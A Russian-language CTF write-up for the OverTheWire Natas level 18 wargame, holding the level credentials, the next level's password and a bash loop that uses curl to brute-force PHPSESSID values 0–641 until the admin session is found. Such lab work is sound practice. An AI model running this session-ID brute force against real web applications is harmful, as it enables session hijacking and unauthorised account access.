---
tags:
  - ctf
created: 2026-04-06
---

# `Level [18]` 
> 

## 🔐 Учётные данные
| Параметр | Значение                                   |
| -------- | ------------------------------------------ |
| Host     | http://natas18.natas.labs.overthewire.org/ |
| Port     |                                            |
| Login    | natas18                                    |
| Password | 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ           |

## 🎯 Цель уровня
- подобрать айди к юзеру админ
## 🎯 Информация

| Тип информации | Данные    |
| -------------- | --------- |
| Куки           | PHPSESSID |


## 📚 Ключевые команды/Техники
| Команда | Описание |
| ------- | -------- |
|         |          |
|         |          |
|         |          |

## 💡 Пошаговое решение
| Шаг | Действие                                                                                     | Команда/Код |
| --- | -------------------------------------------------------------------------------------------- | ----------- |
| 1   | Найти, у какой айди сессии username админ                                                    |             |
| 2   | После нахождения, заменить свой айди в куки, ввести админ в поле юзернейма и получить пароль |             |
| 3   |                                                                                              |             |

## 🔍 Результат
Флаг/Пароль: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

## 🚪 Переход
-> [Level_18]

## 🔗 Ссылки
- [Название ресурса](URL)

## 🔗 Скрипт 

#!/bin/bash

url=http://natas18.natas.labs.overthewire.org/
auth="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
success="You are an admin. The credentials for the next level*"

for id in {0..641}
do
    echo "id: $id"
    if(curl \
    -u $auth \
    -b "PHPSESSID=$id" \
    -s \
    -o 2>/dev/null \
    -d "username=admin" \
    -d "password=1" \
    $url \
    | grep -A 2 "$success")
    then
        echo "Success"
        break
    fi
done